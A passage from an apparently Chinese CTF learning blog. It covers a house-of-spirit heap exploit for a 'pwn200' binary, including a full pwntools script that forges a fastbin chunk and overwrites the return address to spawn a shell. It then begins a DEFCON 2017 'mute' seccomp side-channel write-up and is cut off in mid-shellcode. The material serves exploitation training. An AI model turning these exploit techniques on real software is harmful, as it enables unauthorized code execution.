class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">sub_4007DF</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> nptr[<span class=\"number\">8</span>]; <span class=\"comment\">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v2; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">3</span>; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    read(<span class=\"number\">0</span>, &amp;nptr[i], <span class=\"number\">1uLL</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( nptr[i] == <span class=\"number\">10</span> )  <span class=\"comment\">//换行</span></span><br><span class=\"line\">    &#123; </span><br><span class=\"line\">      nptr[i] = <span class=\"number\">0</span>;  <span class=\"comment\">//空字符</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( nptr[i] &gt; <span class=\"number\">57</span> || nptr[i] &lt;= <span class=\"number\">47</span> ) <span class=\"comment\">// 如果不是数字的话,就打印出来(只读取一个了就),如果是的话,跳过</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;0x%x &quot;</span>, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)nptr[i]);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  v2 = atoi(nptr);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v2 &gt;= <span class=\"number\">0</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> atoi(nptr);</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t要先想办法泄露地址,输入回车的会被替换成0(就相当于字符串到最后了,被截断)</p>\n<p>​\t\t把前面修改为  0x40 fastbin大小,,然后进行free, 然后malloc获取到ret地址,然后就修改ret进行getshell</p>\n<h2 id=\"泄露地址\"><a href=\"#泄露地址\" class=\"headerlink\" title=\"泄露地址\"></a>泄露地址</h2><p>​\t\t不要遗漏每一个函数和语句!</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/image-20230607111909013.png\" alt=\"image-20230607111909013\"></p>\n<p>​\t\t输入48个A泄露rbp</p>\n<p>​\t\t</p>\n<h2 id=\"伪造chunk\"><a href=\"#伪造chunk\" class=\"headerlink\" title=\"伪造chunk\"></a>伪造chunk</h2><p>​\t\t这里是输入money那里,可以直接覆盖到ptr指针,把ptr覆盖了,覆盖成当前rbp的地址之前的某个位置,伪造chunk,free,然后再申请拿到这一块内存控制权限,然后就可以修改ret了,但是两个问题,</p>\n<p>​\t\t1.不知道libc的地址,知道的话,可以直接onegadget了,所以书中的解法是用了shellcode</p>\n<p>​\t\t2.伪造chunk的话,需要满足一定约束,也就是它相邻的chunk的size域和那几个标志位,这个可以通过之前的输入id来解决</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/image-20230607114236103.png\" alt=\"image-20230607114236103\"></p>\n<p>​\t\t可以看一下最终的效果图,很清晰</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/image-20230608201414380.png\" alt=\"image-20230608201414380\"></p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#io = remote(&#x27;0.0.0.0&#x27;, 10001)</span></span><br><span class=\"line\">io = process(<span class=\"string\">&#x27;./pwn200&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">shellcode = asm(shellcraft.amd64.linux.sh(), arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">leak</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> fake_addr</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> shellcode_addr</span><br><span class=\"line\"></span><br><span class=\"line\">\tpayload = shellcode.rjust(<span class=\"number\">48</span>, <span class=\"string\">b&#x27;A&#x27;</span>)</span><br><span class=\"line\">\tio.sendafter(<span class=\"string\">&quot;who are u?\\n&quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\">\tio.recvuntil(payload)</span><br><span class=\"line\">\trbp_addr = u64(io.recvn(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">\tshellcode_addr = rbp_addr - <span class=\"number\">0x20</span> - <span class=\"built_in\">len</span>(shellcode)</span><br><span class=\"line\">\tfake_addr = rbp_addr - <span class=\"number\">0x20</span> - <span class=\"number\">0x30</span> - <span class=\"number\">0x40</span>\t\t<span class=\"comment\"># make fake.size = 0x40</span></span><br><span class=\"line\">\tlog.info(<span class=\"string\">&quot;shellcode address: 0x%x&quot;</span> % shellcode_addr)</span><br><span class=\"line\">\tlog.info(<span class=\"string\">&quot;fake chunk address: 0x%x&quot;</span> % fake_addr)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">house_of_spirit</span>():</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;give me your id ~~?\\n&quot;</span>, <span class=\"string\">&#x27;65&#x27;</span>)\t<span class=\"comment\"># next.size = 0x41</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tfake_chunk  = p64(<span class=\"number\">0</span>) * <span class=\"number\">5</span></span><br><span class=\"line\">\tfake_chunk += p64(<span class=\"number\">0x41</span>)\t\t\t\t\t\t\t<span class=\"comment\"># fake.size</span></span><br><span class=\"line\">\tfake_chunk  = fake_chunk.ljust(<span class=\"number\">0x38</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">\tfake_chunk += p64(fake_addr)\t\t\t\t\t<span class=\"comment\"># overwrite pointer</span></span><br><span class=\"line\">\tio.sendafter(<span class=\"string\">&quot;give me money~\\n&quot;</span>, fake_chunk)</span><br><span class=\"line\"></span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;choice : &quot;</span>, <span class=\"string\">&#x27;2&#x27;</span>)\t\t\t\t<span class=\"comment\"># free(fake_addr)</span></span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;choice : &quot;</span>, <span class=\"string\">&#x27;1&#x27;</span>)\t\t\t\t<span class=\"comment\"># malloc(fake_addr)</span></span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;long?&quot;</span>, <span class=\"string\">&#x27;48&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">\tpayload = <span class=\"string\">b&quot;A&quot;</span> * <span class=\"number\">0x18</span></span><br><span class=\"line\">\tpayload += p64(shellcode_addr) \t\t\t\t\t<span class=\"comment\"># overwrite return address</span></span><br><span class=\"line\">\tpayload = payload.ljust(<span class=\"number\">48</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">\tio.sendafter(<span class=\"string\">&quot;48\\n&quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pwn</span>():</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;choice&quot;</span>, <span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">\tio.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\">leak()</span><br><span class=\"line\">house_of_spirit()</span><br><span class=\"line\">pwn()</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"排错\"><a href=\"#排错\" class=\"headerlink\" title=\"排错\"></a>排错</h3><p>​\t\t自己写的exp一直有问题,有一大片后面的选择\\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;EASY HOTEL&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\\n1. check in\\n2. check out\\n3. goodbye\\nyour choice :的输出</p>\n<p>​\t\t捣鼓半天是leak那里出问题了..一个回车引发的血案……….草……… 造成了后面一堆的错乱,<font color=\"red\">为啥gdb里不影响呢? </font></p>\n<p>​\t\t这里要用send,因为存在offbyone,所以不需要回车,可以正好填满缓冲区,然后把rbp打印出来</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">leak</span>():</span><br><span class=\"line\"> <span class=\"number\">14</span>     <span class=\"keyword\">global</span> fake_addr,shellcode_addr</span><br><span class=\"line\"> <span class=\"number\">15</span>     payload = shellcode.rjust(<span class=\"number\">48</span>,<span class=\"string\">b&#x27;A&#x27;</span>)</span><br><span class=\"line\"> <span class=\"number\">16</span>     p.recvuntil(<span class=\"string\">&quot;who are u?\\n&quot;</span>)</span><br><span class=\"line\"> <span class=\"number\">17</span>     p.send(payload)</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t感觉貌似就算输入48个字符和\\n,也不会有影响呀,是影响了后面的东西吗,比如这个\\n作为后面的输入了? <font color=\"red\">是的,是这样</font></p>\n<p>是的,理论上48个字符后,下一个字符,会放到ebp-0x38,也就是刚才输入的who are u后面的前方(不信可以输入49个a试试)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0000000000400B1F                 call    sub_4007DF</span><br><span class=\"line\">.text:0000000000400B24                 cdqe</span><br><span class=\"line\">.text:0000000000400B26                 mov     [rbp+var_38], rax</span><br><span class=\"line\">.text:0000000000400B2A                 mov     eax, 0</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/image-20230608202658654.png\" alt=\"image-20230608202658654\"></p>\n<p>​\t不正常的,不正常是因为\\n被give you id读取了,然后65\\n和give your money后面全乱了</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/image-20230608203836560.png\" alt=\"image-20230608203836560\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/image-20230608200524103.png\" alt=\"image-20230608200524103\"></p>\n<p>​\t\t正常的(伪造这个0x41的位置),释放后再申请,前面18个随便填充,然后就覆盖返回地址了</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/image-20230608201414380.png\" alt=\"image-20230608201414380\"></p>\n<h1 id=\"待整理\"><a href=\"#待整理\" class=\"headerlink\" title=\"待整理\"></a>待整理</h1><p>​\t感觉貌似就算输入48个字符和\\n,也不会有影响呀,是影响了后面的东西吗,比如这个\\n作为后面的输入了? <font color=\"red\">是的,是这样</font></p>\n<p>程序运行起来了,接入pid调试</p>\n<p>,或者能不能直接看内存空间</p>\n<p>Gdb attach本地进程进去\t</p>\n<p>搞一搞pwntools,深入理解下</p>\n<p>house_of_spirit 也有一个send</p>\n<p>你的exp有问题…不过确实可以找一下其他的学一下</p>\n<p>​\t\t2.伪造chunk的话,需要满足一定约束,也就是它相邻的chunk的size域和那几个标志位,这个可以通过之前的输入id来解决</p>\n<p><a href=\"https://blog.csdn.net/sinat_35360663/article/details/128510319\">https://blog.csdn.net/sinat_35360663/article/details/128510319</a></p>\n<p>后面有个总结不错</p>\n<p>一个回车惹的祸…</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-32-defcon2017%E8%B5%84%E6%A0%BC%E8%B5%9B-mute/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-32-defcon2017%E8%B5%84%E6%A0%BC%E8%B5%9B-mute/",
            "title": "pwn入门-32-defcon2017资格赛-mute",
            "date_published": "2023-06-06T10:20:11.000Z",
            "content_html": "<p>​\t\t侧信道是个很有意思的东西…万物皆可侧信道…各种奇奇怪怪的方法</p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-32-defcon2017%E8%B5%84%E6%A0%BC%E8%B5%9B-mute/image-20230605223341877.png\" alt=\"image-20230605223341877\" style=\"zoom: 33%;\">\n\n\n\n<img src=\"/pwn%E5%85%A5%E9%97%A8-32-defcon2017%E8%B5%84%E6%A0%BC%E8%B5%9B-mute/image-20230606182030547.png\" alt=\"image-20230606182030547\" style=\"zoom:33%;\">\n\n\n\n\n\n<p><a href=\"https://github.com/bannsec/CTF/tree/5e9bba7fa0f398257aae9f4754370aed647a079a/2017/DEFCON/mute\">https://github.com/bannsec/CTF/tree/5e9bba7fa0f398257aae9f4754370aed647a079a/2017/DEFCON/mute</a></p>\n<p>​\t\t好多年前的defcon的题了,但现在来看也并不简单,一方面考察了脑洞,要想到侧信道的办法,另一方面要有比较深厚的计算机基础,比如了解系统调用,会写汇编,对汇编比较熟悉才能写出来exp.</p>\n<h2 id=\"程序分析\"><a href=\"#程序分析\" class=\"headerlink\" title=\"程序分析\"></a>程序分析</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  FILE *v3; <span class=\"comment\">// rdi</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v5; <span class=\"comment\">// [rsp+14h] [rbp-Ch]</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *buf; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  buf = mmap(<span class=\"number\">0LL</span>, <span class=\"number\">0x1000</span>uLL, <span class=\"number\">7</span>, <span class=\"number\">34</span>, <span class=\"number\">-1</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;SILENCE, FOUL DAEMON!&quot;</span>);</span><br><span class=\"line\">  v3 = _bss_start;</span><br><span class=\"line\">  fflush(_bss_start);</span><br><span class=\"line\">  dropSyscalls(v3);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( v5 != <span class=\"number\">4096</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v3 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">    v5 += read(<span class=\"number\">0</span>, buf, <span class=\"number\">4096</span> - v5);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  ((<span class=\"type\">void</span> (__fastcall *)(FILE *))buf)(v3);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t读取一段内容到buf,然后执行读取的内容,很明显,要读取一段shellcode,但是禁用了一些系统调用</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/side<span class=\"meta\"># seccomp-tools dump ./mute</span></span><br><span class=\"line\">SILENCE, FOUL DAEMON!</span><br><span class=\"line\"> line  CODE  JT   JF      K</span><br><span class=\"line\">=================================</span><br><span class=\"line\"> <span class=\"number\">0000</span>: <span class=\"number\">0x20</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000004</span>  A = arch</span><br><span class=\"line\"> <span class=\"number\">0001</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x00</span> <span class=\"number\">0x11</span> <span class=\"number\">0xc000003e</span>  <span class=\"keyword\">if</span> (A != ARCH_X86_64) <span class=\"keyword\">goto</span> <span class=\"number\">0019</span></span><br><span class=\"line\"> <span class=\"number\">0002</span>: <span class=\"number\">0x20</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000000</span>  A = sys_number</span><br><span class=\"line\"> <span class=\"number\">0003</span>: <span class=\"number\">0x35</span> <span class=\"number\">0x00</span> <span class=\"number\">0x01</span> <span class=\"number\">0x40000000</span>  <span class=\"keyword\">if</span> (A &lt; <span class=\"number\">0x40000000</span>) <span class=\"keyword\">goto</span> <span class=\"number\">0005</span></span><br><span class=\"line\"> <span class=\"number\">0004</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x00</span> <span class=\"number\">0x0e</span> <span class=\"number\">0xffffffff</span>  <span class=\"keyword\">if</span> (A != <span class=\"number\">0xffffffff</span>) <span class=\"keyword\">goto</span> <span class=\"number\">0019</span></span><br><span class=\"line\"> <span class=\"number\">0005</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x0c</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000000</span>  <span class=\"keyword\">if</span> (A == read) <span class=\"keyword\">goto</span> <span class=\"number\">0018</span></span><br><span class=\"line\"> <span class=\"number\">0006</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x0b</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000002</span>  <span class=\"keyword\">if</span> (A == open) <span class=\"keyword\">goto</span> <span class=\"number\">0018</span></span><br><span class=\"line\"> <span class=\"number\">0007</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x0a</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000003</span>  <span class=\"keyword\">if</span> (A == close) <span class=\"keyword\">goto</span> <span class=\"number\">0018</span></span><br><span class=\"line\"> <span class=\"number\">0008</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x09</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000004</span>  <span class=\"keyword\">if</span> (A == stat) <span class=\"keyword\">goto</span> <span class=\"number\">0018</span></span><br><span class=\"line\"> <span class=\"number\">0009</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x08</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000005</span>  <span class=\"keyword\">if</span> (A == fstat) <span class=\"keyword\">goto</span> <span class=\"number\">0018</span></span><br><span class=\"line\"> <span class=\"number\">0010</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x07</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000006</span>  <span class=\"keyword\">if</span> (A == lstat) <span class=\"keyword\">goto</span> <span class=\"number\">0018</span></span><br><span class=\"line\"> <span class=\"number\">0011</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x06</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000007</span>  <span class=\"keyword\">if</span> (A == poll) <span class=\"keyword\">goto</span> <span class=\"number\">0018</span></span><br><span class=\"line\"> <span class=\"number\">0012</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x05</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000008</span>  <span class=\"keyword\">if</span> (A == lseek) <span class=\"keyword\">goto</span> <span class=\"number\">0018</span></span><br><span class=\"line\"> <span class=\"number\">0013</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x04</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000009</span>  <span class=\"keyword\">if</span> (A == mmap) <span class=\"keyword\">goto</span> <span class=\"number\">0018</span></span><br><span class=\"line\"> <span class=\"number\">0014</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x03</span> <span class=\"number\">0x00</span> <span class=\"number\">0x0000000a</span>  <span class=\"keyword\">if</span> (A == mprotect) <span class=\"keyword\">goto</span> <span class=\"number\">0018</span></span><br><span class=\"line\"> <span class=\"number\">0015</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x02</span> <span class=\"number\">0x00</span> <span class=\"number\">0x0000000b</span>  <span class=\"keyword\">if</span> (A == munmap) <span class=\"keyword\">goto</span> <span class=\"number\">0018</span></span><br><span class=\"line\"> <span class=\"number\">0016</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x01</span> <span class=\"number\">0x00</span> <span class=\"number\">0x0000000c</span>  <span class=\"keyword\">if</span> (A == brk) <span class=\"keyword\">goto</span> <span class=\"number\">0018</span></span><br><span class=\"line\"> <span class=\"number\">0017</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x00</span> <span class=\"number\">0x01</span> <span class=\"number\">0x0000003b</span>  <span class=\"keyword\">if</span> (A != execve) <span class=\"keyword\">goto</span> <span class=\"number\">0019</span></span><br><span class=\"line\"> <span class=\"number\">0018</span>: <span class=\"number\">0x06</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x7fff0000</span>  <span class=\"keyword\">return</span> ALLOW</span><br><span class=\"line\"> <span class=\"number\">0019</span>: <span class=\"number\">0x06</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000000</span>  <span class=\"keyword\">return</span> KILL</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t诶 不是有execve吗,不能getshell吗</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><p>​\t\t思路是有的,但是编写exp就比较头疼,汇编比较渣,总之一步步来,先open read然后读每个字节,然后比较,(pwncollege好好打打基础!)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.update(arch=<span class=\"string\">&#x27;amd64&#x27;</span>, os=<span class=\"string\">&#x27;linux&#x27;</span>, log_level=<span class=\"string\">&#x27;ERROR&#x27;</span>)  <span class=\"comment\"># 这个必须加,不然shellcraft没法正确识别指令集</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">flag = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">15</span>): <span class=\"comment\"># flag的位数,不知道就可以多写点</span></span><br><span class=\"line\">    c = <span class=\"number\">0</span>  <span class=\"comment\"># 存储字符的ascii码</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>): <span class=\"comment\"># 一个字符8位 循环每一位</span></span><br><span class=\"line\">        p = process(<span class=\"string\">&quot;./mute&quot;</span>)</span><br><span class=\"line\">        p.readline() </span><br><span class=\"line\"></span><br><span class=\"line\">        shellcode = shellcraft.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;./flag&quot;</span>,constants.O_RDONLY,<span class=\"literal\">None</span>) <span class=\"comment\"># 打开文件</span></span><br><span class=\"line\">        shellcode += pwnlib.shellcraft.amd64.mov(<span class=\"string\">&quot;r8&quot;</span>,<span class=\"string\">&quot;rax&quot;</span>) <span class=\"comment\"># 把句柄给r8</span></span><br><span class=\"line\">        shellcode += pwnlib.shellcraft.amd64.lseek(<span class=\"string\">&quot;r8&quot;</span>,i,<span class=\"number\">0</span>) <span class=\"comment\"># lseek 读写文件偏移量,这个就是说,一个字节一个字节读,</span></span><br><span class=\"line\">        shellcode += pwnlib.shellcraft.amd64.read(<span class=\"string\">&quot;r8&quot;</span>,<span class=\"string\">&quot;rsp&quot;</span>,<span class=\"number\">1</span>) <span class=\"comment\"># 把内容读取1字节,读到rsp上</span></span><br><span class=\"line\">        shellcode += <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">            movzx eax, BYTE PTR [rsp]  #把rsp指向的地址处的要比较的字符读取到al中,0扩展到eax</span></span><br><span class=\"line\"><span class=\"string\">            movsx edx,al    # 把要比较的字符放到edx中</span></span><br><span class=\"line\"><span class=\"string\">            mov eax,%s   #把变量放到eax中,就是循环变量 j ,以此循环每个位,一共8位</span></span><br><span class=\"line\"><span class=\"string\">            mov ecx,eax  # 把变量放到ecx</span></span><br><span class=\"line\"><span class=\"string\">            sar edx,cl   # 右移 cl位</span></span><br><span class=\"line\"><span class=\"string\">            mov eax,edx</span></span><br><span class=\"line\"><span class=\"string\">            and eax,1</span></span><br><span class=\"line\"><span class=\"string\">            test eax,eax # and运算、测试是1还是0</span></span><br><span class=\"line\"><span class=\"string\">            je .L2 # 